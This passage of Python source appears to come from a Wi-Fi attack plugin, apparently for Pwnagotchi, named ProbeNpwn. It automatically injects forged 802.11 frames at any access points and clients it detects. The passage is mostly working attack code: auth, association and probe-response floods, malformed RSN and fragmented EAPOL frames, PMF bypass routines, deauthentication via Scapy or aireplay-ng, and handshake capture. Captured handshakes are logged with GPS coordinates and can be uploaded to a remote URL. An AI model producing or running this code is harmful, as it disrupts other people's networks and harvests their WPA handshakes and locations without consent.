                sendp(pkt, iface=self.inject_iface, count=1, inter=0.01, verbose=0)
            except (OSError, IOError, AttributeError):
                pass

    def probe_response_flood(self, ap: dict, client_macs: List[str]):
        if not self.scapy_available or not self.enable_probe_response_flood or self.effective_mode != "maniac":
            return
        for _ in range(5):
            fake_bssid = self._get_random_mac()
            for cl_mac in client_macs[:2]:
                pkt = RadioTap() / Dot11(
                    addr1=cl_mac,
                    addr2=fake_bssid,
                    addr3=fake_bssid,
                    type=0, subtype=5
                ) / Dot11ProbeResp(
                    timestamp=0,
                    beacon_interval=100,
                    cap=0x2100
                ) / Dot11Elt(ID=0, len=8, info=b'fakeAP')
                try:
                    sendp(pkt, iface=self.inject_iface, count=1, inter=0.05, verbose=0)
                except (OSError, IOError, AttributeError):
                    pass

    def auth_flood(self, ap: dict, client_macs: List[str]):
        if not self.scapy_available or not self.enable_auth_flood or self.effective_mode != "maniac":
            return
        for _ in range(20):
            fake_mac = self._get_random_mac()
            pkt = RadioTap() / Dot11(
                addr1=ap['mac'],
                addr2=fake_mac,
                addr3=ap['mac']
            ) / Dot11Auth(algo=0, seqnum=1, status=0)
            try:
                sendp(pkt, iface=self.inject_iface, count=1, inter=0.01, verbose=0)
            except (OSError, IOError, AttributeError):
                pass

    def assoc_flood(self, ap: dict, client_macs: List[str]):
        if not self.scapy_available or not self.enable_assoc_flood or self.effective_mode != "maniac":
            return
        for _ in range(20):
            fake_mac = self._get_random_mac()
            pkt = RadioTap() / Dot11(
                addr1=ap['mac'],
                addr2=fake_mac,
                addr3=ap['mac']
            ) / Dot11AssoReq(listen_interval=0) / Dot11Elt(ID=0, len=0)
            try:
                sendp(pkt, iface=self.inject_iface, count=1, inter=0.01, verbose=0)
            except (OSError, IOError, AttributeError):
                pass

    def rsn_corrupt_variants(self, ap: dict, client_macs: List[str]):
        if not self.scapy_available:
            return
        if not client_macs:
            return
        variants = [
            Dot11Elt(ID=48, len=6, info=b'\x01\x00\x00\x00\x01\x00'),
            Dot11Elt(ID=48, len=4, info=b'\x01\x00\x04\x00'),
            Dot11Elt(ID=48, len=20, info=b'\x01\x00\x04\x00\x01\x00\x04\x00\x01\x00\x02\x00\xff\xff'),
        ]
        for cl_mac in client_macs[:2]:
            for variant in variants[:2]:
                pkt = RadioTap() / Dot11(
                    addr1=ap['mac'],
                    addr2=cl_mac,
                    addr3=ap['mac']
                ) / Dot11AssoReq(listen_interval=0) / variant
                try:
                    sendp(pkt, iface=self.inject_iface, count=2, inter=0.1, verbose=0)
                except (OSError, IOError, AttributeError) as e:
                    self.logger.debug(f"RSN corrupt variant failed: {e}")
            frag1 = Dot11Elt(ID=48, len=10, info=b'\x01\x00\x04\x00\x01\x00\x04\x00\x01\x00')
            frag2 = Dot11Elt(ID=48, len=8, info=b'\x02\x00\x00\x00\x00\x00\x00\x00')
            pkt1 = RadioTap() / Dot11(
                addr1=ap['mac'],
                addr2=cl_mac,
                addr3=ap['mac']
            ) / Dot11AssoReq(listen_interval=0) / frag1
            pkt2 = RadioTap() / Dot11(
                addr1=ap['mac'],
                addr2=cl_mac,
                addr3=ap['mac']
            ) / Dot11AssoReq(listen_interval=0) / frag2
            try:
                sendp(pkt1, iface=self.inject_iface, count=1, verbose=0)
                time.sleep(0.05)
                sendp(pkt2, iface=self.inject_iface, count=1, verbose=0)
            except (OSError, IOError, AttributeError) as e:
                self.logger.debug(f"Fragmented RSN IE failed: {e}")

    def frag_variants(self, ap: dict, client_macs: List[str]):
        if not self.scapy_available:
            return
        if not client_macs:
            return
        replay = struct.pack(">Q", random.randint(1, 0xFFFFFFFFFFFFFFFF))
        payload = (
            b'\x02' + struct.pack(">H", 0x008a) + replay +
            b'\x00\x10' + b'\x00' * 16 + b'\x01' * 77
        )
        eapol = EAPOL(version=2, type=3, len=len(payload)) / Raw(load=payload)
        client_mac = client_macs[0]
        base_pkt = (
            RadioTap()
            / Dot11(addr1=ap['mac'], addr2=client_mac, addr3=ap['mac'], FCfield="to-DS")
            / LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
            / SNAP()
            / eapol
        )
        for fragsize in [50, 100, 150]:
            try:
                frags = fragment(base_pkt, fragsize=fragsize)
            except Exception as e:
                self.logger.debug(f"Fragment creation failed: {e}")
                continue
            for f in frags:
                try:
                    sendp(f, iface=self.inject_iface, count=1, inter=0.02, verbose=0)
                except (OSError, IOError, AttributeError) as e:
                    self.logger.debug(f"Frag variant send failed: {e}")

    def ps_poll_attack(self, ap: dict, client_macs: List[str]):
        if not self.scapy_available or not self.enable_ps_poll:
            return
        for cl_mac in client_macs[:3]:
            pkt = RadioTap() / Dot11(
                addr1=ap['mac'],
                addr2=cl_mac,
                addr3=ap['mac'],
                type=1, subtype=10
            ) / Raw(load=b'\x42\x42')
            try:
                sendp(pkt, iface=self.inject_iface, count=3, inter=0.1, verbose=0)
            except (OSError, IOError, AttributeError) as e:
                self.logger.debug(f"PS-Poll attack failed: {e}")

    def cf_end_attack(self, ap: dict, client_macs: List[str]):
        if not self.scapy_available or not self.enable_cf_end:
            return
        pkt = RadioTap() / Dot11(
            addr1="ff:ff:ff:ff:ff:ff",
            addr2=ap['mac'],
            addr3=ap['mac'],
            type=1, subtype=14
        )
        try:
            sendp(pkt, iface=self.inject_iface, count=5, inter=0.1, verbose=0)
        except (OSError, IOError, AttributeError) as e:
            self.logger.debug(f"CF-End attack failed: {e}")

    def mimo_attack(self, ap: dict, client_macs: List[str]):
        if not self.enable_mimo or not self.scapy_available:
            return
        if not client_macs:
            return
        pkt = RadioTap() / Dot11(
            addr1=ap['mac'],
            addr2=client_macs[0],
            addr3=ap['mac']
        ) / Dot11Action(category=3) / Raw(load=b'\x00')
        try:
            sendp(pkt, iface=self.inject_iface, count=2, inter=0.2, verbose=0)
        except (OSError, IOError, AttributeError) as e:
            self.logger.debug(f"MIMO attack failed: {e}")

    def probe_clients(self, ap: dict, client_macs: List[str]):
        if not self.scapy_available:
            return
        common_ssids = ['network', 'linksys', 'default', 'home', 'guest', 'iPhone', 'AndroidAP']
        for cl_mac in client_macs[:2]:
            for ssid in random.sample(common_ssids, min(2, len(common_ssids))):
                pkt = RadioTap() / Dot11(
                    addr1=ap['mac'],
                    addr2=cl_mac,
                    addr3=ap['mac']
                ) / Dot11ProbeReq() / Dot11Elt(ID=0, len=len(ssid), info=ssid.encode())
                try:
                    sendp(pkt, iface=self.inject_iface, count=1, inter=0.1, verbose=0)
                except (OSError, IOError, AttributeError) as e:
                    self.logger.debug(f"Probe client failed: {e}")

    # ------------------------------------------------------------------
    # Main attack function
    # ------------------------------------------------------------------
    def attack_target(self, agent, ap: dict, cl: dict = None, retry: int = 0):
        if retry > self.max_retries:
            return
        ap_mac = ap['mac'].lower()
        if not self._rate_limit_ap(ap_mac):
            self._push_retry(agent, ap, cl, retry + 1, delay=30)
            return
        if not self.ok_to_attack(agent, ap):
            return

        if not self._check_system_load():
            self.paused = True
            return
        else:
            self.paused = False

        if self.dry_run:
            self.logger.info(f"DRY RUN: would attack {ap_mac} with client {cl['mac'] if cl else 'none'}")
            return

        agent.set_channel(ap['channel'])

        # Snapshot capabilities to avoid holding locks during attack loop
        with self.ap_cap_lock:
            ap_caps = self.ap_capabilities.get(ap_mac, {}).copy()
        clients = self.ap_client_groups.get(ap_mac, [])
        if cl:
            clients = [cl['mac'].lower()] if cl['mac'].lower() in clients else []

        client_data = [self.recents.get(c) for c in clients if self.recents.get(c)]
        client_macs = [c['mac'].lower() for c in client_data if c]

        # Snapshot client capabilities for TDLS
        client_caps_list = []
        if self.enable_tdls:
            with self.client_cap_lock:
                for cl_mac in client_macs:
                    cl_caps = self.client_capabilities.get(cl_mac, {}).copy()
                    cl_caps['mac'] = cl_mac
                    client_caps_list.append(cl_caps)

        use_pmf = self.scapy_available and self.pmf_bypass_methods and self.is_pmf_protected(ap)

        throttle_d = self.dynamic_attack_delay(ap, cl, retry) * self.get_scaled_param('throttle_d')
        throttle_a = self.dynamic_attack_delay(ap, cl, retry) * self.get_scaled_param('throttle_a')

        # Quiet association attacks (no deauth)
        self.pmkid_association_attack(ap, ap_caps)
        time.sleep(throttle_a * 0.5)  # small delay between attacks
        self.auth_frame_harvest(ap, ap_caps)
        time.sleep(throttle_a * 0.5)
        self.reassociation_pmkid_attack(ap, ap_caps)
        time.sleep(throttle_a * 0.5)
        self.probe_with_rsn(ap, ap_caps)
        time.sleep(throttle_a * 0.5)

        # PMF bypass attacks
        if use_pmf:
            for method in self.pmf_bypass_methods:
                self.current_pmf_method = method
                if method == 'assoc_sleep':
                    self._pmf_assoc_sleep(ap, client_macs)
                elif method == 'bad_msg':
                    self._pmf_bad_msg(ap, client_macs)
                elif method == 'rsn_corrupt':
                    self._pmf_rsn_corrupt(ap, client_macs)
                elif method == 'frag':
                    self._pmf_frag(ap, client_macs)
                time.sleep(0.1)

        # Existing attacks
        self.wpa3_downgrade_attack(ap, client_macs, ap_caps)
        self.ft_handshake_attack(ap, client_macs, ap_caps)
        self.tdls_attack(ap, client_macs, ap_caps, client_caps_list)
        self.mesh_attack(ap, client_macs, ap_caps)
        self.wps_attack(ap, ap_caps)
        self.eapol_start_injection(ap, client_macs, ap_caps)
        self.eapol_logoff_injection(ap, client_macs, ap_caps)
        self.disassociation_attack(ap, client_macs)
        self.null_data_attack(ap, client_macs)
        self.csa_attack(ap, client_macs)
        if self.effective_mode == "maniac":
            self.beacon_flood(ap, client_macs)
            self.probe_response_flood(ap, client_macs)
            self.auth_flood(ap, client_macs)
            self.assoc_flood(ap, client_macs)
        self.rsn_corrupt_variants(ap, client_macs)
        self.frag_variants(ap, client_macs)
        self.ps_poll_attack(ap, client_macs)
        self.cf_end_attack(ap, client_macs)
        self.mimo_attack(ap, client_macs)

        self.probe_clients(ap, client_macs)

        # Deauth – only if enabled in personality
        if self._get_personality_setting(agent, 'deauth', True) and random.random() < self.get_scaled_param('deauth_prob'):
            for cli in client_data:
                if self.scapy_available:
                    src_mac = self._get_random_mac() if self.mac_randomization else ap['mac']
                    pkt = RadioTap() / Dot11Deauth(addr1=cli['mac'], addr2=src_mac, addr3=ap['mac'], reason=7)
                    try:
                        sendp(pkt, iface=self.inject_iface, count=int(1/throttle_d), inter=throttle_d, verbose=0)
                    except (OSError, IOError, AttributeError) as e:
                        self.logger.debug(f"deauth failed: {e}")
                elif self.use_external_tools and self.external_tools.get('aireplay'):
                    if self.dry_run:
                        self.logger.info(f"DRY RUN: would run aireplay-ng deauth on {cli['mac']}")
                        continue
                    cmd = ["aireplay-ng", "-0", "1", "-a", ap['mac'], "-c", cli['mac'], self.inject_iface]
                    try:
                        subprocess.run(cmd, timeout=5, capture_output=True)
                    except (subprocess.TimeoutExpired, subprocess.CalledProcessError, OSError) as e:
                        self.logger.debug(f"aireplay deauth failed: {e}")
                else:
                    agent.deauth(ap, cli, throttle=throttle_d)

        # Associate – only if enabled in personality
        if self._get_personality_setting(agent, 'associate', True):
            num_clients = len(client_macs)
            assoc_prob = 1.0 if num_clients <= 1 else self.get_scaled_param('assoc_prob') * (0.4 if num_clients > 5 else 0.7)
            last_succ = self.last_success_time.get(ap_mac, 0)
            if num_clients == 0 and time.time() - last_succ > 120:
                assoc_prob = 0.95

            if random.random() < assoc_prob:
                future = self.executor.submit(agent.associate, ap, throttle=throttle_a)
                future.add_done_callback(lambda f: self._check_assoc_result(ap_mac, f))

        self.attack_attempts[ap_mac] += 1
        self.attack_count_epoch += 1

    # ------------------------------------------------------------------
    # Retry queue (efficient using negative timestamps)
    # ------------------------------------------------------------------
    def _push_retry(self, agent, ap: dict, cl: dict, retry: int, delay: float):
        with self.retry_queue_lock:
            timestamp = time.time() + delay
            heapq.heappush(self.retry_queue, (-timestamp, retry, (agent, ap, cl, retry)))
            if len(self.retry_queue) > MAX_RETRY_QUEUE:
                heapq.heappop(self.retry_queue)

    def _process_retry_queue(self):
        now = time.time()
        with self.retry_queue_lock:
            while self.retry_queue and -self.retry_queue[0][0] <= now:
                neg_ts, retry, args = heapq.heappop(self.retry_queue)
                self.executor.submit(self.attack_target, *args)

    # ------------------------------------------------------------------
    # Association result callback
    # ------------------------------------------------------------------
    def _check_assoc_result(self, ap_mac: str, future: Future):
        try:
            future.result(timeout=5)
        except Exception as e:
            self.assoc_fails[ap_mac] += 1
            if self.assoc_fails[ap_mac] >= 3 and time.time() - self.last_success_time.get(ap_mac, 0) > 300:
                self.blacklist.put(ap_mac, time.time() + 3600)
                self._save_blacklist()
                self.logger.info(f"Blacklisted {ap_mac} – assoc failure pattern")

    # ------------------------------------------------------------------
    # Event handlers
    # ------------------------------------------------------------------
    def on_bcap_wifi_ap_new(self, agent, event):
        ap = event['data']
        self.channel_activity[ap['channel']]["aps"] += 1
        self.new_aps_per_epoch += 1
        self._parse_ap_capabilities(ap)
        if self.ok_to_attack(agent, ap):
            self.track_recent(ap)
            self.executor.submit(self.attack_target, agent, ap)

    def on_bcap_wifi_client_new(self, agent, event):
        ap = event['data']['AP']
        cl = event['data']['Client']
        ap_mac = ap['mac'].lower()
        cl_mac = cl['mac'].lower()
        self.channel_activity[ap['channel']]["clients"] += 1

        if ap_mac not in self.ap_client_groups:
            self.ap_client_groups[ap_mac] = []
        if cl_mac not in self.ap_client_groups[ap_mac]:
            self.ap_client_groups[ap_mac].append(cl_mac)
            if len(self.ap_client_groups[ap_mac]) > MAX_CLIENTS_PER_AP:
                self.ap_client_groups[ap_mac].pop(0)
        if len(self.ap_client_groups) > MAX_AP_GROUPS:
            self.ap_client_groups.popitem(last=False)

        signal = cl.get('signal', -100)
        activity = cl.get('activity', 1) + (len(self.ap_client_groups.get(ap_mac, [])) / 10.0)
        old_score = self.client_scores.get(cl_mac, 0)
        new_score = max(0, old_score * SCORE_DECAY_FACTOR) + (signal + 100) * activity
        self.client_scores[cl_mac] = new_score
        if len(self.client_scores) > MAX_SCORES:
            self.client_scores.popitem(last=False)

        if 'packet' in cl:
            self._parse_client_capabilities(cl, packet=cl['packet'])

        if self.ok_to_attack(agent, ap):
            self.track_recent(ap, cl)
            self.executor.submit(self.attack_target, agent, ap, cl)

    def on_bcap_wifi_ap_updated(self, agent, event):
        self.on_bcap_wifi_ap_new(agent, event)

    def on_bcap_wifi_client_updated(self, agent, event):
        self.on_bcap_wifi_client_new(agent, event)

    # ------------------------------------------------------------------
    # Handshake capture event
    # ------------------------------------------------------------------
    def on_handshake(self, agent, filename, ap, cl):
        if isinstance(ap, str):
            ap_mac = ap.lower()
            ap_dict = self.recents.get(ap_mac) or {'mac': ap_mac, 'channel': 0, 'hostname': ''}
        else:
            ap_mac = ap['mac'].lower()
            ap_dict = ap

        if cl and isinstance(cl, str):
            cl_mac = cl.lower()
            cl_dict = self.recents.get(cl_mac) or {'mac': cl_mac}
        else:
            cl_mac = cl['mac'].lower() if cl else 'pmkid'
            cl_dict = cl

        key = (ap_mac, cl_mac)
        with self.handshake_lock:
            if key in self.handshake_db:
                return
            if len(self.handshake_db) >= MAX_HANDSHAKE_DB:
                self.handshake_db.popitem(last=False)
            self.handshake_db[key] = time.time()

        self.success_counts[ap_mac] += 1
        self.last_success_time[ap_mac] = time.time()
        self.assoc_fails[ap_mac] = 0

        with self.rate_limiter_lock:
            if ap_mac in self.rate_limiters:
                self.rate_limiters[ap_mac].update_stats(True)

        channel = ap_dict.get('channel', 0)
        if channel > 0:
            self.channel_success[channel] += 1

        if ap_mac in self.blacklist.cache:
            self.blacklist.remove(ap_mac)
            self._save_blacklist()

        if self.effective_mode == "tactical":
            self.cooldowns.put(ap_mac, time.time() + 60)

        self._log_handshake(ap_dict, cl_dict, filename)

        if self.upload_url:
            try:
                self.upload_queue.put((ap_dict, cl_dict, filename), block=False)
            except queue.Full:
                self.logger.warning("Upload queue full, dropping handshake record")

    def _log_handshake(self, ap: dict, cl: dict, filename: str):
        gps = self.agent.session().get('gps', {}) if self.agent else {}
        entry = {
            "time": time.time(),
            "ap_mac": ap.get('mac', 'unknown').lower(),
            "essid": ap.get('hostname', ''),
            "client_mac": cl.get('mac', '').lower() if cl else None,
            "file": filename,
            "gps": {
                "lat": gps.get('Latitude'),
                "lon": gps.get('Longitude'),
                "alt": gps.get('Altitude')
            }
        }
        self.json_logger.info(json.dumps(entry))

    # ------------------------------------------------------------------
    # Uploader thread
    # ------------------------------------------------------------------
    def _start_uploader(self):
        if not requests:
            self.logger.warning("requests module not installed, upload disabled")
            return
        self.upload_running = True
        self.upload_thread = threading.Thread(target=self._upload_worker, daemon=True)
        self.upload_thread.start()

    def _upload_worker(self):
        while self.upload_running:
            try:
                ap, cl, filename = self.upload_queue.get(timeout=1)
                self._upload_handshake(ap, cl, filename)
            except queue.Empty:
                continue
            except Exception as e:
                self.logger.exception("Upload worker error")

    def _upload_handshake(self, ap: dict, cl: dict, filename: str):
        if not self.upload_url:
            return
        try:
            data = {
                "ap_mac": ap.get('mac', '').lower(),
                "essid": ap.get('hostname', ''),
                "client_mac": cl.get('mac', '').lower() if cl else None,
                "file": filename,
                "timestamp": time.time()
            }
            resp = requests.post(self.upload_url, json=data, timeout=10)
            if resp.status_code != 200:
                self.logger.warning(f"Upload failed: {resp.status_code}")
            else:
                self.logger.debug("Handshake uploaded")
        except requests.exceptions.RequestException as e:
            self.logger.debug(f"Upload error: {e}")

    # ------------------------------------------------------------------
    # Epoch event
    # ------------------------------------------------------------------
    def on_epoch(self, agent, epoch, epoch_data):
        now = time.time()

        self._process_retry_queue()

        self.recents.cleanup()
        self.delay_cache.cleanup()
        self.blacklist.cleanup()
        self.cooldowns.cleanup()
        self._cleanup_rate_limiters()

        with self.external_processes_lock:
            still_alive = []
            for proc in self.external_processes:
                if proc.poll() is None:
                    still_alive.append(proc)
                else:
                    self.external_semaphore.release()
            self.external_processes = still_alive

        for ch in list(self.channel_success):
            self.channel_success[ch] *= CHANNEL_SUCCESS_DECAY

        for cl_mac in list(self.client_scores.keys()):
            self.client_scores[cl_mac] *= SCORE_DECAY_FACTOR
            if self.client_scores[cl_mac] < 1:
                del self.client_scores[cl_mac]

        for mac in list(self.attack_attempts.keys()):
            self.attack_attempts[mac] = int(self.attack_attempts[mac] * ATTEMPT_DECAY_FACTOR)
            if self.attack_attempts[mac] == 0:
                del self.attack_attempts[mac]
        for mac in list(self.success_counts.keys()):
            self.success_counts[mac] = int(self.success_counts[mac] * ATTEMPT_DECAY_FACTOR)
            if self.success_counts[mac] == 0:
                del self.success_counts[mac]
        for mac in list(self.assoc_fails.keys()):
            self.assoc_fails[mac] = int(self.assoc_fails[mac] * ATTEMPT_DECAY_FACTOR)
            if self.assoc_fails[mac] == 0:
                del self.assoc_fails[mac]
        cutoff = now - 3600
        for mac in list(self.last_success_time.keys()):
            if self.last_success_time[mac] < cutoff:
                del self.last_success_time[mac]

        if self.mode == "adaptive" and self.epoch_count % 10 == 0:
            tot_att = sum(self.attack_attempts.values())
            tot_suc = sum(self.success_counts.values())
            rate = tot_suc / max(1, tot_att)
            density = sum(d["aps"] + d["clients"] for d in self.channel_activity.values())
            if rate < 0.2 and density > 30:
                self.effective_mode = "maniac"
            elif rate > 0.4 or density < 15:
                self.effective_mode = "tactical"
            self.logger.info(f"Adaptive → {self.effective_mode} (rate {rate:.2f}, density {density})")

        self.epoch_count += 1
        if self.epoch_count % self.env_check_interval == 0:
            self.mobility_score = self.calculate_mobility_score(agent)
            if hasattr(agent, '_config'):
                for p in ['recon_time', 'ap_ttl', 'sta_ttl', 'deauth_prob', 'assoc_prob', 'min_rssi', 'throttle_a', 'throttle_d']:
                    agent._config['personality'][p] = self.get_scaled_param(p)
            self.new_aps_per_epoch = 0

        for ch in self.channel_activity:
            self.channel_activity[ch]["aps"] = int(self.channel_activity[ch]["aps"] * 0.9)
            self.channel_activity[ch]["clients"] = int(self.channel_activity[ch]["clients"] * 0.9)

        if now - self.last_state_save > STATE_SAVE_INTERVAL:
            self._save_state()
            self.last_state_save = now


# ----------------------------------------------------------------------
# Plugin entry point
# ----------------------------------------------------------------------
def __load_plugin__():
    return ProbeNpwn()

